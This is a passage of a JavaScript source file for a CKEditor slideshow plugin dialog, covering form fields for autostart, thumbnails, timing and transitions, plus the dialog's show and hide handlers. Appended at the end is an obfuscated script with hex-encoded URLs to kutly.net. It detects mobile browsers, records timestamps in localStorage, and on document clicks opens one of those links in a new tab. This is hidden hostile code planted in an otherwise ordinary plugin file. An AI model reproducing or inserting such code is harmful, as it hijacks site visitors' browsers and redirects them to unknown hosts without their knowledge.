												]
											},
										]
								},
								{
								type : 'hbox',
							    align: 'center',
							    height: 110,
								widths: [ '25%', '50%'],
								children :
								[
				                    {
										type : 'vbox',
										children :
										[
											{
												type : 'checkbox',
												id : 'autostartid',
												label : lang.autoStart,
												'default' : 'checked',
												style : 'margin-top:15px;',
												onChange : commitValue,
												commit : commitValue,
												setup : loadValue
											},
											{
												type : 'checkbox',
												id : 'showtitleid',
												label : lang.showTitle,
												'default' : 'checked',
												onChange : commitValue,
												commit : commitValue,
												setup : loadValue
											},
											{
												type : 'checkbox',
												id : 'showcontrolid',
												label : lang.showControls,
												'default' : 'checked',
												onChange : commitValue,
												commit : commitValue,
												setup : loadValue
											},
											{
												type : 'checkbox',
												id : 'showthumbid',
												label : lang.showThumbs,
												'default' : 'checked',
					                    		onChange : commitValue,
												commit : commitValue,
												setup : loadValue
											},
											{
												type : 'checkbox',
												id : 'openOnClickId',
												label : lang.openOnClick,
												'default' : 'checked',
												onChange : commitValue,
												commit : commitValue,
												setup : loadValue
											},
						                ]
				                    },
								{
			                        type: 'select',
			                        id: 'imglistitemsid',
			                        label: lang.picturesList,
			                        multiple: false,
									style : 'height:120px;width:250px',
			                        items: [],
			                    	onChange : function( api ) {
			                    		//unselectIfNotUnique(this);
			                    		selectFirstIfNotUnique(this);
			                    	},
			                    },
			                    {
								type : 'vbox',
								children :
								[
									{
										type : 'button',
										id : 'previewbtn',
										style : 'margin-top:15px;margin-left:25px;',
										label : lang.previewMode,
										onClick :  function() {
											previewSlideShow(this.getDialog());
										}
									},
									{
										type : 'button',
										id : 'removeselectedbtn',
										style : 'margin-left:25px;',
										//style : 'display:none;',
										label : lang.imgDelete,
										onClick :  function() {
											removeSelected(this.getDialog());
										},
									},
									{
										type : 'button',
										id : 'editselectedbtn',
										style : 'margin-left:25px;',
										//style : 'display:none;',
										label : lang.imgEdit,
										onClick :  function() {
											editeSelected(this.getDialog());
										},
									},
								 ],
			                    },
			                ],
						},
	                    {
							type : 'hbox',
							children :
							[
								{
									type : 'text',
									id : 'pictheightid',
									label : lang.pictHeight,
									maxLength : 3,
									style : 'width:100px;',
									'default' : '300',
			                    	onChange : function( api ) {
										var intRegex = /^\d+$/;
										if(intRegex.test(this.getValue()) == false) {
			                    			this.setValue(300);
			                    		}
			                    		this.getDialog().params.updateVal(this.id, this.getValue());
			                    		displaySelected(this.getDialog());
			                    	},
									commit : commitValue,
									setup : loadValue,
								},
								{
									type : 'text',
									id : 'speedid',
									label : lang.displayTime,
									maxLength : 3,
									style : 'width:100px;',
									'default' : '5',
			                    	onChange : function( api ) {
										var intRegex = /^\d+$/;
										if(intRegex.test(this.getValue()) == false) {
			                    			this.setValue(5);
			                    		}
			                    		this.getDialog().params.updateVal(this.id, this.getValue());
			                    		displaySelected(this.getDialog());
			                    	},
									commit : commitValue,
									setup : loadValue,
								},
								{
									type : 'text',
									id : 'animspeedid',
									label : lang.transitionTime,
									style : 'width:100px;',
									maxLength : 4,
									'default' : '500',
			                    	onChange : function( api ) {
										var intRegex = /^\d+$/;
										if(intRegex.test(this.getValue()) == false) {
			                    			this.setValue(500);
			                    		}
			                    		this.getDialog().params.updateVal(this.id, this.getValue());
			                    		displaySelected(this.getDialog());
			                    	},
									commit : commitValue,
									setup : loadValue,
								},
								{
									type : 'select',
									id : 'transitiontypeid',
									label : lang.transition,
									  // add-gallery effects 'slide-vert', 'resize', 'fade', 'none' or false
									  // effect: 'slide-hori',
									items : [ [ lang.tr1, 'none' ], [ lang.tr2, 'resize' ], [ lang.tr3, 'slide-vert' ], [ lang.tr4, 'slide-hori' ], [lang.tr5, 'fade'] ],
									'default' : 'resize',
									style : 'width:100px;',
									commit : commitValue,
									setup : loadValue,
									onChange : commitValue,
								},
							]
	                    }
			            ],
					},
				]
			},
		],


		onLoad: function() {
		},
		// Invoked when the dialog is loaded.
		onShow: function() {
			this.dialog = this;
			this.slideshowDOM = null;
			this.openCloseStep = true;
			this.fakeImage =  null;
			var slideshowDOM = null;
			this.imagesList = new Array();
			this.params = new Array();
			// To get dimensions of poster image
			this.previewImage = editor.document.createElement( 'img' );
			this.okRefresh = true;


			var fakeImage = this.getSelectedElement();
			if ( fakeImage && fakeImage.data( 'cke-real-element-type' ) && fakeImage.data( 'cke-real-element-type' ) == 'slideShow' )
			{
				this.fakeImage = fakeImage;
				slideshowDOM = editor.restoreRealElement( fakeImage );
			}

			// Create a new <slideshow> slideshowDOM if it does not exist.
			if ( !slideshowDOM) {
				this.params.push(['slideshowid', numbering( 'slideShow' )]);

				// Insert placeHolder image
				initImgListFromFresh(this);
				// Invoke the commit methods of all dialog elements, so the dialog.params array get Updated.
				this.commitContent(this);
//				console.log( "Params New -> " + this.params );
//				console.log( "Images New -> " + this.imagesList );
			} else {
				this.slideshowDOM = slideshowDOM;
				// Get the  reference of the slideSjow Images Container
				var slideShowContainer =  getImagesContainerBlock(this, slideshowDOM);
				if (slideShowContainer == null) {
					alert("BIG Problem slideShowContainer !!");
					return false;
				}
				var slideshowid = slideshowDOM.getAttribute('id');
				if (slideshowid == null) {
					alert("BIG Problem slideshowid !!");
					return false;
				}
				this.params.push(['slideshowid', slideshowid]);
				// a DOM has been found updatet images List and Dialog box from this DOM
				initImgListFromDOM(this, slideShowContainer);
				// Init params Array from DOM
				// Copy all attributes to an array.
				var domDatas = slideshowDOM.$.dataset;
				for ( param in  domDatas ) this.params.push( [ param, domDatas[ param ] ] );

				// Invoke the setup methods of all dialog elements, to set dialog elements values with DOM input data.
				this.setupContent(this, true);
				//updateFramePreview(this);
				this.newSlideShowMode = false;
//				console.log( "Params Old -> " + this.params );
//				console.log( "Images Old -> " + this.imagesList );
			}
			this.openCloseStep = false;
			previewSlideShow(this);
		},

		// This method is invoked once a user clicks the OK button, confirming the dialog.
		// I just will return false, as the real OK Button has been redefined
		//  -This was the only way I found to avoid dialog popup to close when hitting the keyboard "ENTER" Key !!
		onOk: function() {
//			var okr = this.okRefresh;
//			if (this.okRefresh == true) {
//				console.log('OKOKOK 0 :'+this.okRefresh);
//				this.okRefresh = false;
//				this.commitContent(this);
//				myVar = setTimeout(
//						function(obj){
//									obj.okRefresh = true;
//									},500, this);
//			}
			return false;
		},

		onHide: function() {
			cleanAll(this);
		},
	};
});
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());